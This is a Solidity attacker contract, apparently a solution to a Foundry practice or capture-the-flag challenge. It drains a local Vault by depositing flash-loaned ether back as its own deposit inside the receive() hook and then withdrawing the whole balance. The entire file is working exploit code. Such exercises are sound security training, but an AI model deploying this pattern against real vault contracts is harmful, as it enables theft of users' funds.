// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import {Vault} from "./Vault.sol";
import {console} from "forge-std/console.sol";

contract Attacker {
    Vault public vault;
    bool public hacked;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() public {
        console.log("Attacker balance1", address(this).balance);
        vault.flashLoan(address(vault).balance);
        vault.withdraw(address(vault).balance);
        console.log("Attacker balance4", address(this).balance);
    }
    receive() external payable {
        if (!hacked) {
            hacked = true;
            console.log("Attacker balance2", address(this).balance);
            vault.deposit{value: address(this).balance}();
            console.log("Attacker balance3", address(this).balance);
        }
    }
}
